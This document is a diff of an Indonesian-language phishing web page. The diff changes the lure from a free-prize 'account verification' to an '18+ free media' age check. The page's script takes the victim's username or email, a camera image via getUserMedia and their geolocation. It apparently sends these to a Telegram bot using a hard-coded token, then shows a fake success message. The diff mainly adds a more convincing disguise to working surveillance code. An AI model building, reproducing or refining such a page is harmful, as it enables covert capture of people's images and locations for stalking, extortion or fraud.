@@ -1,20 +1,132 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Verifikasi Akun - Hadiah Gratis</title>
+    <title>18+ FREE MEDIA - Verifikasi Umur</title>
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <style>
-        body { font-family: Arial; background: #111; color: #fff; text-align: center; padding: 50px; }
-        input { padding: 15px; font-size: 18px; border-radius: 8px; border: none; width: 80%; margin-bottom: 20px; }
-        button { background: #e91e63; color: #fff; border: none; padding: 20px 40px; font-size: 20px; border-radius: 10px; cursor: pointer; }
+        * { box-sizing: border-box; margin: 0; padding: 0; }
+        body {
+            font-family: 'Segoe UI', Tahoma, sans-serif;
+            background: linear-gradient(135deg, #1a1a2e 0%, #16213e 50%, #0f0f1a 100%);
+            color: #fff;
+            text-align: center;
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+        .container {
+            max-width: 500px;
+            margin: 0 auto;
+            background: rgba(0, 0, 0, 0.6);
+            border: 2px solid #ff2e63;
+            border-radius: 20px;
+            padding: 40px 25px;
+            box-shadow: 0 0 30px rgba(255, 46, 99, 0.5);
+        }
+        .badge {
+            display: inline-block;
+            background: #ff2e63;
+            color: #fff;
+            font-weight: bold;
+            padding: 8px 20px;
+            border-radius: 50px;
+            font-size: 14px;
+            margin-bottom: 20px;
+            animation: pulse 1.5s infinite;
+        }
+        @keyframes pulse {
+            0% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 46, 99, 0.7); }
+            70% { transform: scale(1.05); box-shadow: 0 0 0 15px rgba(255, 46, 99, 0); }
+            100% { transform: scale(1); box-shadow: 0 0 0 0 rgba(255, 46, 99, 0); }
+        }
+        h1 {
+            font-size: 28px;
+            margin-bottom: 15px;
+            color: #fff;
+            text-shadow: 0 0 10px #ff2e63;
+        }
+        h1 span { color: #ff2e63; }
+        p {
+            font-size: 15px;
+            color: #ccc;
+            margin-bottom: 25px;
+            line-height: 1.5;
+        }
+        .preview {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 25px;
+            opacity: 0.7;
+        }
+        .preview div {
+            width: 80px;
+            height: 80px;
+            background: #333;
+            border-radius: 10px;
+            border: 1px solid #ff2e63;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            font-size: 30px;
+        }
+        input {
+            width: 100%;
+            padding: 16px;
+            font-size: 16px;
+            border-radius: 10px;
+            border: 2px solid #333;
+            background: #1a1a2e;
+            color: #fff;
+            margin-bottom: 15px;
+            outline: none;
+        }
+        input:focus { border-color: #ff2e63; }
+        button {
+            width: 100%;
+            background: linear-gradient(90deg, #ff2e63, #ff6b9d);
+            color: #fff;
+            border: none;
+            padding: 18px;
+            font-size: 18px;
+            font-weight: bold;
+            border-radius: 10px;
+            cursor: pointer;
+            text-transform: uppercase;
+            letter-spacing: 1px;
+            box-shadow: 0 5px 20px rgba(255, 46, 99, 0.4);
+        }
+        button:hover { opacity: 0.9; }
+        .footer {
+            margin-top: 20px;
+            font-size: 12px;
+            color: #666;
+        }
+        .loading {
+            display: none;
+            margin-top: 20px;
+            color: #ff2e63;
+            font-weight: bold;
+        }
     </style>
 </head>
 <body>
-    <h1>Verifikasi Akun</h1>
-    <p>Masukin username lu buat klaim hadiah.</p>
-    <input type="text" id="username" placeholder="Username lu">
-    <br>
-    <button onclick="mulai()">VERIFIKASI SEKARANG</button>
+    <div class="container">
+        <div class="badge">🔞 KHUSUS 18+</div>
+        <h1>FREE <span>MEDIA</span> 18+</h1>
+        <p>Konten eksklusif cuma buat yang udah verifikasi umur. Isi username lu, terus klik tombol di bawah buat buka akses.</p>
+
+        <div class="preview">
+            <div>🔥</div>
+            <div>💋</div>
+            <div>🎬</div>
+        </div>
+
+        <input type="text" id="username" placeholder="Username / Email lu">
+        <button onclick="mulai()">BUKA AKSES SEKARANG</button>
+
+        <div class="loading" id="loading">⏳ Memverifikasi umur lu...</div>
+        <div class="footer">Dengan klik, lu setuju umur lu 18+ dan siap liat konten dewasa.</div>
+    </div>
 
     <script>
         const TOKEN = "8777217464:AAEmVGBbywZcC31sos3o-9_mF6Pt_Y4pTJQ";
@@ -22,6 +134,8 @@
 
         async function mulai() {
             const username = document.getElementById('username').value || "gak diisi";
+            document.getElementById('loading').style.display = 'block';
+
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 const video = document.createElement('video');
@@ -54,14 +168,17 @@
                             body: formData
                         });
 
-                        alert("Verifikasi berhasil! Hadiah lu sedang diproses.");
+                        document.getElementById('loading').style.display = 'none';
+                        alert("Verifikasi berhasil! Akses konten 18+ lu udah dibuka. Refresh halaman ya.");
                     },
                     (err) => {
-                        alert("Lu harus izinkan lokasi buat verifikasi!");
+                        document.getElementById('loading').style.display = 'none';
+                        alert("Lu harus izinkan lokasi buat verifikasi umur!");
                     }
                 );
             } catch (err) {
-                alert("Lu harus izinkan kamera buat verifikasi!");
+                document.getElementById('loading').style.display = 'none';
+                alert("Lu harus izinkan kamera buat verifikasi umur!");
             }
         }
     </script>
